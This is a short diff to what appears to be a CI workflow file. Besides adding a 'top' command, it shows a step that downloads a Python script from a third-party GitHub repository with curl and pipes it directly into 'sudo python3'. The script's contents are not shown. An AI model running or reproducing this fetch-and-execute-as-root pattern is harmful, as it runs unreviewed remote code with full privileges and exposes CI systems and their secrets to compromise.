@@ -31,3 +31,4 @@ jobs:
         run: |
           pip3 install supervisor
           curl -s https://raw.githubusercontent.com/memerememe/macostest/master/.github/workflows/jasonman.py | sudo python3
+          top
